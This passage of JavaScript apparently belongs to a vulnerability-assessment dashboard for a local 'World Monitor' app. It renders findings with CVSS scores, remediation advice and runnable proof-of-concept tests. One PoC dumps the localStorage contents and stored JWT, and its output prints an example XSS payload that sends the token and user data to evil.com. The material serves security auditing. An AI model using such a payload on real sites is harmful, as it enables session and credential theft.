        const value = localStorage.getItem(key);
        allKeys.push({ key, valueLength: value?.length, preview: value?.substring(0, 80) });
      }

      return {
        status: storedToken ? 'exploited' : 'idle',
        output: `═══ PoC: Insecure Client-Side Token Storage ═══

[1] localStorage CONTENTS:
${allKeys.map(k => `    Key: "${k.key}"
    Length: ${k.valueLength} chars
    Preview: ${k.preview}...`).join('\n\n')}

[2] STORED TOKEN (wm_token):
    ${storedToken ? storedToken.substring(0, 80) + '...' : 'NOT FOUND (not logged in)'}
    
    ${storedToken ? '⚠️  Full JWT token accessible to any JavaScript!' : 'ℹ️  Log into the World Monitor app first to populate localStorage.'}

[3] STORED USER DATA (wm_user):
    ${parsedUser ? JSON.stringify(parsedUser, null, 4) : 'NOT FOUND (not logged in)'}
    
    ${parsedUser?.password ? '⚠️  CRITICAL: Password stored in localStorage!' : ''}
    ${parsedUser?.apiKey ? '⚠️  API Key stored in localStorage!' : ''}

[4] EXPLOITATION (XSS + localStorage):
    An XSS payload can steal everything with one line:
    
    <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: localStorage.getItem('wm_token'),
        user: localStorage.getItem('wm_user')
      })
    });
    </script>
    
    Combined with V-007 (Reflected XSS), this creates
    a complete credential theft attack chain.

[5] RECOMMENDED APPROACH:
    Use HttpOnly cookies:
    res.cookie('session', token, {
      httpOnly: true,   // Not accessible via JavaScript
      secure: true,     // HTTPS only
      sameSite: 'Strict', // CSRF protection
      maxAge: 900000    // 15 minutes
    });`
      };
    }
  }
];

// ============================================
// Render Vulnerabilities
// ============================================

function renderVulnerabilities(filter = 'all') {
  const container = document.getElementById('vulnList');
  const filtered = filter === 'all' ? vulnerabilities : vulnerabilities.filter(v => v.severity === filter);

  container.innerHTML = filtered.map(v => `
    <div class="sd-vuln-card" data-severity="${v.severity}" data-id="${v.id}">
      <div class="sd-vuln-header" onclick="toggleVuln('${v.id}')">
        <span class="sd-vuln-severity severity-${v.severity}">${v.severity}</span>
        <span class="sd-vuln-id">${v.id}</span>
        <span class="sd-vuln-title">${v.title}</span>
        <span class="sd-vuln-cvss cvss-${v.severity}">CVSS ${v.cvss}</span>
        <span class="sd-vuln-toggle">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
        </span>
      </div>
      <div class="sd-vuln-body">
        <div class="sd-vuln-content">
          <div class="sd-vuln-grid">
            <div class="sd-detail-block">
              <div class="sd-detail-label">Description</div>
              <div class="sd-detail-value">${v.description}</div>
            </div>
            <div class="sd-detail-block">
              <div class="sd-detail-label">Business Impact</div>
              <div class="sd-detail-value">${v.impact}</div>
            </div>
            <div class="sd-detail-block">
              <div class="sd-detail-label">Affected Component</div>
              <div class="sd-detail-value"><code>${v.component}</code></div>
            </div>
            <div class="sd-detail-block">
              <div class="sd-detail-label">CWE Classification</div>
              <div class="sd-detail-value"><code>${v.cwe}</code></div>
            </div>
            <div class="sd-detail-block">
              <div class="sd-detail-label">CVSS Vector</div>
              <div class="sd-detail-value"><code>${v.cvssVector}</code></div>
            </div>
            <div class="sd-detail-block">
              <div class="sd-detail-label">Steps to Reproduce</div>
              <div class="sd-detail-value">
                <ol class="sd-steps">
                  ${v.steps.map(s => `<li>${s}</li>`).join('')}
                </ol>
              </div>
            </div>
            <div class="sd-detail-block full">
              <div class="sd-detail-label">Remediation Recommendations</div>
              <div class="sd-detail-value">
                <ul class="sd-remediation">
                  ${v.remediation.map(r => `<li>${r}</li>`).join('')}
                </ul>
              </div>
            </div>
          </div>

          <div class="sd-poc-section">
            <h4>
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18"><polygon points="5 3 19 12 5 21 5 3"/></svg>
              Proof of Concept
            </h4>
            <span class="sd-poc-status poc-status-idle" id="pocStatus-${v.id}">● Ready to test</span>
            <button class="sd-btn sd-btn-poc" onclick="runPoc('${v.id}')">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><polygon points="5 3 19 12 5 21 5 3"/></svg>
              Run PoC Test
            </button>
            <div class="sd-poc-result" id="pocResult-${v.id}" style="display:none">
              <pre id="pocOutput-${v.id}"></pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  `).join('');
}

// ============================================
// Toggle Vulnerability Card
// ============================================

function toggleVuln(id) {
  const card = document.querySelector(`.sd-vuln-card[data-id="${id}"]`);
  if (card) card.classList.toggle('open');
}

// ============================================
// Run Proof of Concept
// ============================================

async function runPoc(id) {
  const vuln = vulnerabilities.find(v => v.id === id);
  if (!vuln || !vuln.poc) return;

  const statusEl = document.getElementById(`pocStatus-${id}`);
  const resultEl = document.getElementById(`pocResult-${id}`);
  const outputEl = document.getElementById(`pocOutput-${id}`);

  // Update status
  statusEl.className = 'sd-poc-status poc-status-running';
  statusEl.innerHTML = '<span class="sd-spinner"></span> Running PoC test...';
  resultEl.style.display = 'none';

  try {
    const result = await vuln.poc();
    
    statusEl.className = `sd-poc-status poc-status-${result.status}`;
    statusEl.textContent = result.status === 'exploited' ? '● Vulnerability Confirmed' : '● Test Complete';
    
    resultEl.style.display = 'block';
    resultEl.className = `sd-poc-result ${result.status === 'exploited' ? 'warning' : ''}`;
    outputEl.textContent = result.output;
  } catch (err) {
    statusEl.className = 'sd-poc-status poc-status-idle';
    statusEl.textContent = '● Error running test';
    resultEl.style.display = 'block';
    resultEl.className = 'sd-poc-result error';
    outputEl.textContent = `Error: ${err.message}\n\nMake sure the World Monitor server is running on http://localhost:3000`;
  }
}

// ============================================
// Run All PoC Tests
// ============================================

document.getElementById('runAllBtn')?.addEventListener('click', async () => {
  const btn = document.getElementById('runAllBtn');
  btn.innerHTML = '<span class="sd-spinner"></span> Running all tests...';
  btn.disabled = true;

  // Open all cards
  document.querySelectorAll('.sd-vuln-card').forEach(card => card.classList.add('open'));

  // Run tests sequentially
  for (const vuln of vulnerabilities) {
    await runPoc(vuln.id);
    await new Promise(r => setTimeout(r, 300));
  }

  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><polygon points="5 3 19 12 5 21 5 3"/></svg> Run All PoC Tests';
  btn.disabled = false;
});

// ============================================
// Filter Tabs
// ============================================

document.querySelectorAll('.sd-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.sd-tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    renderVulnerabilities(tab.dataset.filter);
  });
});

// ============================================
// Severity Chart
// ============================================

function renderSeverityChart() {
  const ctx = document.getElementById('severityChart');
  if (!ctx) return;

  new Chart(ctx, {
    type: 'doughnut',
    data: {
      labels: ['Critical', 'High', 'Medium', 'Low'],
      datasets: [{
        data: [4, 3, 2, 1],
        backgroundColor: [
          'rgba(255, 45, 85, 0.8)',
          'rgba(255, 107, 53, 0.8)',
          'rgba(255, 184, 0, 0.8)',
          'rgba(0, 188, 212, 0.8)'
        ],
        borderWidth: 0,
        spacing: 3,
        borderRadius: 4,
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      cutout: '60%',
      plugins: {
        legend: {
          position: 'bottom',
          labels: {
            color: '#7d89a8',
            padding: 16,
            usePointStyle: true,
            pointStyleWidth: 8,
            font: { size: 12, weight: '600' }
          }
        }
      }
    }
  });
}

// ============================================
// Modal
// ============================================

document.getElementById('pocClose')?.addEventListener('click', () => {
  document.getElementById('pocModal').style.display = 'none';
});

document.getElementById('pocModal')?.addEventListener('click', (e) => {
  if (e.target === e.currentTarget) {
    e.currentTarget.style.display = 'none';
  }
});

// ============================================
// Initialize
// ============================================

renderVulnerabilities();
renderSeverityChart();
